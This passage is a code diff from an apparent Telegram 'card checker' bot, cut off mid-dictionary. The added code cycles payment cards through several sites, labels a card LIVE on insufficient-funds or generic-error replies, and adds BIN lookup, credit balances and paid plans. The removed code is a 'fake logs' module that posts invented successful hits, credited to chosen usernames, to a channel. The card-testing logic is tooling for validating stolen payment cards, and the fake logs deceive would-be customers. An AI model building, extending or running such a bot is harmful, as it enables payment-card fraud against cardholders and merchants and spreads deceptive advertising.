+        # ── Pace: small delay between rounds to avoid flooding the API ─
+        # Make rechecking process as fast as possible
+        if classify_response(last_resp) == "RECHECK":
+            await asyncio.sleep(0.05)  # minimal delay for rechecks
+        else:
+            await asyncio.sleep(ROUND_DELAY)
 
-    elif dat == "fl_noop":
-        pass  # display-only label button
+    # ── All attempts exhausted ────────────────────────────────────────────────
+    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
+    # Only keep as LIVE if the last response was INSUFFICIENT_FUNDS or GENERIC_ERROR.
+    # Otherwise, return DEAD.
+    if last_resp:
+        mu = last_resp.upper().strip()
+        if "INSUFFICIENT_FUNDS" in mu or "GENERIC_ERROR" in mu:
+            return "LIVE", last_resp, price, currency
+            
+    return "DEAD", last_resp, price, currency
 
-    # ── IDs panel ───────────────────────────────────────────────────────────
-    elif dat == "fl_ids":
-        _clear_state(bd)
-        await q.edit_message_text(
-            _ids_text(bd), parse_mode="HTML",
-            reply_markup=_ids_kb(bd),
-        )
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# MISC HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _te(eid: str, fb: str = "●") -> str:
+    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
 
-    elif dat == "fl_addid":
-        bd[_K_STATE] = "awaiting_id"
-        await q.edit_message_text(
-            "<b>➕ Add Fake Log ID</b>\n──────────────────\n"
-            "Send the user info in your next message:\n\n"
-            "<b>Format:</b>  <code>123456789 @username</code>\n"
-            "or just:      <code>@username</code>\n\n"
-            "<i>This name appears as the checker on every fake hit.</i>\n"
-            "──────────────────\n"
-            "Send /fakeon to cancel.",
-            parse_mode="HTML",
-        )
+def _u16len(s: str) -> int:
+    return len(s.encode("utf-16-le")) // 2
 
-    elif dat.startswith("fltog_"):
-        try:
-            idx = int(dat.split("_", 1)[1])
-        except (ValueError, IndexError):
-            return
-        ids = _get_ids(bd)
-        if 0 <= idx < len(ids):
-            ids[idx]["enabled"] = not ids[idx].get("enabled", True)
-        await q.edit_message_text(
-            _ids_text(bd), parse_mode="HTML",
-            reply_markup=_ids_kb(bd),
-        )
+def html_to_entities(html: str):
+    text     = ""
+    entities = []
+    stack    = []
+    i        = 0
+    n        = len(html)
 
-    elif dat.startswith("flrem_"):
-        try:
-            idx = int(dat.split("_", 1)[1])
-        except (ValueError, IndexError):
-            return
-        ids = _get_ids(bd)
-        if 0 <= idx < len(ids):
-            removed = ids.pop(idx)
-            await q.answer(f"✅ {removed['display']} removed.", show_alert=False)
-        await q.edit_message_text(
-            _ids_text(bd), parse_mode="HTML",
-            reply_markup=_ids_kb(bd),
-        )
+    while i < n:
+        ch = html[i]
 
-    # ── Speed panel ─────────────────────────────────────────────────────────
-    elif dat == "fl_speed":
-        _clear_state(bd)
-        await q.edit_message_text(
-            _speed_text(), parse_mode="HTML",
-            reply_markup=_speed_kb(bd),
-        )
+        if ch == "<":
+            j   = html.index(">", i)
+            tag = html[i + 1 : j]
 
-    elif dat.startswith("flspd_"):
-        spd = dat.split("_", 1)[1]
-        if spd in _SPEEDS:
-            bd[_K_SPEED] = spd
-            await q.answer(f"✅ Speed set to {_SPEED_LABELS[spd]}", show_alert=False)
-        await q.edit_message_text(
-            _speed_text(), parse_mode="HTML",
-            reply_markup=_speed_kb(bd),
-        )
+            if tag.startswith("/"):
+                tag_name = tag[1:].strip().lower()
+                for k in range(len(stack) - 1, -1, -1):
+                    if stack[k]["name"] == tag_name:
+                        entry  = stack.pop(k)
+                        start  = entry["offset"]
+                        end    = _u16len(text)
+                        length = end - start
+                        if length > 0:
+                            if tag_name == "b":
+                                entities.append(MessageEntity(
+                                    type="bold", offset=start, length=length))
+                            elif tag_name == "code":
+                                entities.append(MessageEntity(
+                                    type="code", offset=start, length=length))
+                            elif tag_name == "a":
+                                entities.append(MessageEntity(
+                                    type="text_link", offset=start,
+                                    length=length, url=entry.get("url", "")))
+                        break
+                i = j + 1
 
-    # ── Stats panel ─────────────────────────────────────────────────────────
-    elif dat == "fl_show":
-        _clear_state(bd)
-        await q.edit_message_text(
-            _show_text(bd), parse_mode="HTML",
-            reply_markup=_show_kb(),
-        )
+            elif tag.lower().startswith("tg-emoji"):
+                m = re.search(r'emoji-id="([^"]+)"', tag)
+                if m:
+                    emoji_id  = m.group(1)
+                    close_idx = html.index("</tg-emoji>", j + 1)
+                    fallback  = html[j + 1 : close_idx]
+                    offset    = _u16len(text)
+                    text     += fallback
+                    length    = _u16len(fallback)
+                    if length > 0:
+                        entities.append(MessageEntity(
+                            type="custom_emoji", offset=offset,
+                            length=length, custom_emoji_id=emoji_id))
+                    i = close_idx + len("</tg-emoji>")
+                else:
+                    i = j + 1
 
-    elif dat == "fl_clrstats":
-        for e in _get_ids(bd):
-            e["count"] = 0
-        await q.answer("✅ Stats cleared.", show_alert=False)
-        await q.edit_message_text(
-            _show_text(bd), parse_mode="HTML",
-            reply_markup=_show_kb(),
-        )
-
-    # ── Links panel ─────────────────────────────────────────────────────────
-    elif dat == "fl_links":
-        _clear_state(bd)
-        await q.edit_message_text(
-            _links_text(bd), parse_mode="HTML",
-            reply_markup=_links_kb(bd),
-        )
-
-    elif dat.startswith("fledit_"):
-        # Owner tapped on a link slot to edit it
-        try:
-            idx = int(dat.split("_", 1)[1])
-        except (ValueError, IndexError):
-            return
-        if 0 <= idx < 3:
-            _clear_state(bd)
-            bd[_K_EDIT_IDX] = idx
-            await q.edit_message_text(
-                _link_edit_text(idx, bd), parse_mode="HTML",
-                reply_markup=_link_edit_kb(idx),
-            )
-
-    elif dat.startswith("fllt_"):
-        # Set Link TEXT for slot idx
-        try:
-            idx = int(dat.split("_", 1)[1])
-        except (ValueError, IndexError):
-            return
-        bd[_K_STATE]    = "awaiting_link_text"
-        bd[_K_EDIT_IDX] = idx
-        await q.edit_message_text(
-            f"<b>📝 Set Text for Link {idx+1}</b>\n"
-            f"──────────────────\n"
-            f"Send the button label text in your next message.\n\n"
-            f"<b>Example:</b> <code>🔥 Join Channel</code>\n\n"
-            f"<i>Keep it short — Telegram buttons have limited width.</i>\n"
-            f"──────────────────\nSend /fakeon to cancel.",
-            parse_mode="HTML",
-        )
-
-    elif dat.startswith("fllu_"):
-        # Set Link URL for slot idx
-        try:
-            idx = int(dat.split("_", 1)[1])
-        except (ValueError, IndexError):
-            return
-        bd[_K_STATE]    = "awaiting_link_url"
-        bd[_K_EDIT_IDX] = idx
-        await q.edit_message_text(
-            f"<b>🔗 Set URL for Link {idx+1}</b>\n"
-            f"──────────────────\n"
-            f"Send the full URL in your next message.\n\n"
-            f"<b>Examples:</b>\n"
-            f"<code>https://t.me/yourchannel</code>\n"
-            f"<code>https://t.me/yourgrouplink</code>\n"
-            f"<code>https://t.me/Batxchk_bot</code>\n\n"
-            f"<i>Must start with https:// or http://</i>\n"
-            f"──────────────────\nSend /fakeon to cancel.",
-            parse_mode="HTML",
-        )
-
-    elif dat.startswith("fllc_"):
-        # Clear / reset link slot
-        try:
-            idx = int(dat.split("_", 1)[1])
-        except (ValueError, IndexError):
-            return
-        links = _get_links(bd)
-        if 0 <= idx < 3:
-            # Slot 0 resets to bot default; others become empty
-            if idx == 0:
-                links[idx] = {"text": "𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", "url": _DEFAULT_BOT_URL}
             else:
-                links[idx] = {"text": "", "url": ""}
-            await q.answer(f"✅ Link {idx+1} cleared.", show_alert=False)
-        _clear_state(bd)
-        await q.edit_message_text(
-            _links_text(bd), parse_mode="HTML",
-            reply_markup=_links_kb(bd),
-        )
+                tag_name = tag.split()[0].lower() if tag else ""
+                entry    = {"name": tag_name, "offset": _u16len(text)}
+                if tag_name == "a":
+                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
+                    if m:
+                        entry["url"] = m.group(1)
+                stack.append(entry)
+                i = j + 1
 
-    # ── Channel panel ────────────────────────────────────────────────────────
-    elif dat == "fl_channel":
-        _clear_state(bd)
-        await q.edit_message_text(
-            _channel_text(bd), parse_mode="HTML",
-            reply_markup=_channel_kb(),
-        )
+        elif ch == "&":
+            if   html[i:i+4] == "&lt;":  text += "<"; i += 4
+            elif html[i:i+4] == "&gt;":  text += ">"; i += 4
+            elif html[i:i+5] == "&amp;": text += "&"; i += 5
+            elif html[i:i+6] == "&quot;":text += '"'; i += 6
+            else:                        text += ch;  i += 1
 
-    elif dat == "fl_setchannel":
-        bd[_K_STATE] = "awaiting_channel"
-        await q.edit_message_text(
-            "<b>📡 Enter Channel ID</b>\n"
-            "──────────────────\n"
-            "Send the channel/group ID in your next message.\n\n"
-            "<b>Format:</b>  <code>-1001234567890</code>\n\n"
-            "<b>How to find the ID:</b>\n"
-            "• Forward a message from your channel to @userinfobot\n"
-            "• Or send /getid inside the channel (bot must be admin)\n\n"
-            "<i>Channels always have negative IDs starting with -100</i>\n"
-            "──────────────────\nSend /fakeon to cancel.",
-            parse_mode="HTML",
-        )
+        else:
+            text += ch
+            i    += 1
 
+    return text, entities if entities else None
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MESSAGE CAPTURE — handles all awaiting-input states
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _send_ents(html: str):
+    return html_to_entities(html)
 
-async def _msg_capture(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Captures the owner's next plain-text message for any active input state.
-    Completely silent and passes through if no state is active."""
-    if not update.effective_user or update.effective_user.id != OWNER_ID:
-        return
+class MsgBuilder:
+    __slots__ = ("_txt", "_ents")
 
-    bd    = context.bot_data
-    state = bd.get(_K_STATE)
+    def __init__(self):
+        self._txt  = ""
+        self._ents = []
 
-    if not state:
-        return   # no active state — let other handlers process
+    @staticmethod
+    def _u16(s: str) -> int:
+        return len(s.encode("utf-16-le")) // 2
 
-    raw = (update.message.text or "").strip()
+    def raw(self, s: str) -> "MsgBuilder":
+        if s: self._txt += s
+        return self
 
-    # ── Add user ID ───────────────────────────────────────────────────────────
-    if state == "awaiting_id":
-        parts     = raw.split()
-        uid_val   = None
-        uname_val = None
-        for p in parts:
-            if p.startswith("@"):
-                uname_val = p
-            elif p.lstrip("-").isdigit():
-                uid_val = p
+    def bold(self, s: str) -> "MsgBuilder":
+        if not s: return self
+        o = self._u16(self._txt); l = self._u16(s); self._txt += s
+        if l: self._ents.append(MessageEntity(type="bold", offset=o, length=l))
+        return self
 
-        if not uid_val and not uname_val:
-            await update.message.reply_text(
-                "<b>❌ Could not parse.</b>\n"
-                "Send: <code>123456789 @username</code>\n"
-                "or just <code>@username</code>",
-                parse_mode="HTML",
+    def code(self, s: str) -> "MsgBuilder":
+        if not s: return self
+        o = self._u16(self._txt); l = self._u16(s); self._txt += s
+        if l: self._ents.append(MessageEntity(type="code", offset=o, length=l))
+        return self
+
+    def link(self, display: str, url: str) -> "MsgBuilder":
+        if not display: return self
+        o = self._u16(self._txt); l = self._u16(display); self._txt += display
+        if l: self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
+        return self
+
+    def emoji(self, eid: str, fb: str) -> "MsgBuilder":
+        if not fb: return self
+        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
+        if l: self._ents.append(
+            MessageEntity(type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
+        return self
+
+    def bold_emoji(self, eid: str, fb: str) -> "MsgBuilder":
+        if not fb: return self
+        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
+        if l:
+            self._ents.append(MessageEntity(type="bold", offset=o, length=l))
+            self._ents.append(MessageEntity(
+                type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
+        return self
+
+    def bold_link(self, display: str, url: str) -> "MsgBuilder":
+        if not display: return self
+        o = self._u16(self._txt); l = self._u16(display); self._txt += display
+        if l:
+            self._ents.append(MessageEntity(type="bold",      offset=o, length=l))
+            self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
+        return self
+
+    def italic(self, s: str) -> "MsgBuilder":
+        if not s: return self
+        o = self._u16(self._txt); l = self._u16(s); self._txt += s
+        if l: self._ents.append(MessageEntity(type="italic", offset=o, length=l))
+        return self
+
+    def mention(self, username: str) -> "MsgBuilder":
+        if not username: return self
+        o = self._u16(self._txt); l = self._u16(username); self._txt += username
+        if l: self._ents.append(MessageEntity(type="mention", offset=o, length=l))
+        return self
+
+    def nl(self, n: int = 1) -> "MsgBuilder":
+        self._txt += "\n" * n
+        return self
+
+    def build(self):
+        return self._txt, self._ents if self._ents else None
+
+def _uname(user) -> str:
+    return getattr(user, "first_name", None) or "User"
+
+def _uurl(user) -> str:
+    if getattr(user, "username", None):
+        return f"https://t.me/{user.username}"
+    return f"tg://user?id={user.id}"
+
+async def _get_sticker_fid(bot, emoji_id: str):
+    return None
+
+async def _send_sticker(bot, chat_id, emoji_id: str):
+    pass
+
+async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
+                          parse_mode: str = "HTML", reply_markup=None,
+                          disable_notification: bool = False,
+                          reply_to_message_id: int = None):
+    try:
+        if emoji_id:
+            full_html = (
+                f'<b><tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji></b>\n'
+                f'{caption}'
             )
-            return
+        else:
+            full_html = caption
 
-        display = uname_val or f"user_{uid_val}"
-        link    = (
-            f"https://t.me/{uname_val.lstrip('@')}"
-            if uname_val
-            else f"tg://user?id={uid_val}"
+        plain_text, ents = html_to_entities(full_html)
+
+        await bot.send_message(
+            chat_id=chat_id,
+            text=plain_text,
+            entities=ents if ents else None,
+            reply_markup=reply_markup,
+            disable_web_page_preview=True,
+            disable_notification=disable_notification,
+            reply_to_message_id=reply_to_message_id,
         )
-        key_val = uid_val or uname_val
+    except Exception as exc:
+        logging.warning(f"[MEDIA] send_message to {chat_id} failed: {exc}")
 
-        ids = _get_ids(bd)
-        for e in ids:
-            if e["uid"] == key_val:
-                _clear_state(bd)
-                await update.message.reply_text(
-                    f"<b>⚠️ {display} is already in the list.</b>",
-                    parse_mode="HTML",
-                )
-                return
+def _plan_eid(plan: str) -> str:
+    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
+    if norm in PLAN_EMOJIS:
+        return PLAN_EMOJIS[norm]
+    for k, v in PLAN_EMOJIS.items():
+        if k in norm:
+            return v
+    return PRO_EMOJI_ID
 
-        ids.append({
-            "uid":     key_val,
-            "display": display,
-            "link":    link,
-            "enabled": True,
-            "count":   0,
-        })
-        _clear_state(bd)
-        await update.message.reply_text(
-            f"<b>✅ {display} added to fake logs.</b>\n"
-            f"Use /fakeon → 📋 IDs to manage.",
-            parse_mode="HTML",
-        )
-        return
+def _user_link(user) -> str:
+    name = escape(getattr(user, "first_name", None) or "User")
+    if getattr(user, "username", None):
+        return f'<a href="https://t.me/{user.username}">{name}</a>'
+    return f'<a href="tg://user?id={user.id}">{name}</a>'
 
-    # ── Set channel ID ────────────────────────────────────────────────────────
-    if state == "awaiting_channel":
-        cid_str = raw.lstrip("-").isdigit() and raw or raw.lstrip("-")
-        if not raw.lstrip("-").isdigit():
-            await update.message.reply_text(
-                "<b>❌ Invalid channel ID.</b>\n"
-                "It must be a number like <code>-1001234567890</code>\n"
-                "Send /fakeon to cancel.",
-                parse_mode="HTML",
-            )
-            return
-        cid = int(raw)
-        bd[_K_CHANNEL] = cid
-        _clear_state(bd)
-        await update.message.reply_text(
-            f"<b>✅ Channel ID saved!</b>\n"
-            f"──────────────────\n"
-            f"<b>ID ➛</b> <code>{cid}</code>\n\n"
-            f"Fake logs will go to this channel.\n"
-            f"Use /fakeon to open the panel and start.",
-            parse_mode="HTML",
-        )
-        return
+def _fmt_time(s: float) -> str:
+    s = int(s)
+    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"
 
-    # ── Set link text ─────────────────────────────────────────────────────────
-    if state == "awaiting_link_text":
-        idx   = bd.get(_K_EDIT_IDX, 0)
-        links = _get_links(bd)
-        if 0 <= idx < 3:
-            links[idx]["text"] = raw
-        _clear_state(bd)
-        await update.message.reply_text(
-            f"<b>✅ Link {idx+1} text set to:</b> {raw}\n\n"
-            f"Now set the URL with /fakeon → 🔗 Links → ✏️ Edit → 🔗 Set URL",
-            parse_mode="HTML",
-        )
-        return
+def _fmt_price(price: str, currency: str) -> str:
+    try:
+        v = float(re.sub(r"[^\d.]", "", price or ""))
+        if v > 0:
+            return f"{v:.2f} {escape(currency)}"
+    except Exception:
+        pass
+    return "0.00 USD"
 
-    # ── Set link URL ──────────────────────────────────────────────────────────
-    if state == "awaiting_link_url":
-        idx   = bd.get(_K_EDIT_IDX, 0)
-        links = _get_links(bd)
-        if not raw.startswith(("https://", "http://")):
-            await update.message.reply_text(
-                "<b>❌ URL must start with https:// or http://</b>\n"
-                "Send the full URL again, or /fakeon to cancel.",
-                parse_mode="HTML",
-            )
-            return
-        if 0 <= idx < 3:
-            links[idx]["url"] = raw
-        _clear_state(bd)
-        await update.message.reply_text(
-            f"<b>✅ Link {idx+1} URL set!</b>\n"
-            f"<b>Text ➛</b> {links[idx].get('text') or '<i>empty — set text too</i>'}\n"
-            f"<b>URL  ➛</b> {raw}\n\n"
-            f"Use /fakeon → 🔗 Links to review all 3 buttons.",
-            parse_mode="HTML",
-        )
-        return
+def _is_premium(ud: dict, uid: int) -> bool:
+    return (uid == OWNER_ID or ud.get("premium", False)
+            or ud.get("plan") not in (None, "TRIAL"))
 
+def _get_ud(uid: int, ctx) -> dict:
+    ud_store = ctx.bot_data.setdefault("user_data", {})
+    key      = str(uid)
+    if key not in ud_store:
+        from datetime import datetime as _dt
+        ud_store[key] = {
+            "name": "User", "first_name": "User", "last_name": "", "username": "",
+            "language_code": "en",
+            "joined":      _dt.now().strftime("%Y-%m-%d %H:%M"),
+            "last_active": _dt.now().strftime("%Y-%m-%d %H:%M"),
+            "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0,
+            "total_refs": 0, "total_checks": 0, "approved_checks": 0,
+            "declined_checks": 0, "last_gate": "N/A", "last_card": "N/A",
+            "codes_redeemed": 0, "keys_redeemed": 0, "banned": False,
+            "total_charged": 0,
+        }
+    return ud_store[key]
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# REGISTER  —  the ONLY function called from main.py
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _sid() -> str:
+    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
-def register(app: Application) -> None:
-    """
-    Register all fake-logs handlers into the PTB Application.
-
-    Call this inside your main() function BEFORE app.run_polling():
-
-        import fake_logs
-        ...
-        fake_logs.register(app)
-        app.run_polling(...)
-
-    Handlers are added BEFORE any generic catch-all so fl_* callbacks
-    and the message-capture handler fire correctly.
-    """
-    # ── Commands ──────────────────────────────────────────────────────────────
-    app.add_handler(CommandHandler("myid",    _cmd_myid))
-    app.add_handler(CommandHandler("fakeon",  _cmd_fakeon))
-    app.add_handler(CommandHandler("fakeoff", _cmd_fakeoff))
-    app.add_handler(CommandHandler("getid",   _cmd_getid))
-
-    # ── Callback buttons ──────────────────────────────────────────────────────
-    app.add_handler(CallbackQueryHandler(
-        _cb,
-        pattern=(
-            r"^(fl_panel|fl_start|fl_stop|fl_noop"
-            r"|fl_ids|fl_addid"
-            r"|fl_speed|fl_show|fl_clrstats"
-            r"|fl_links|fl_channel|fl_setchannel"
-            r"|fltog_\d+|flrem_\d+"
-            r"|flspd_\w+"
-            r"|fledit_\d+|fllt_\d+|fllu_\d+|fllc_\d+)$"
-        ),
-    ))
-
-    # ── Message capture (owner only, any active input state) ──────────────────
-    app.add_handler(MessageHandler(
-        filters.TEXT & filters.User(OWNER_ID) & ~filters.COMMAND,
-        _msg_capture,
-    ))
-
-    logger.info("[FAKELOGS] Advanced fake logs module registered — owner only.")
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BIN LOOKUP
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+COUNTRY_FLAGS = {
+    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
+    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
+    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
+    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
+    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
+    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
+    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮
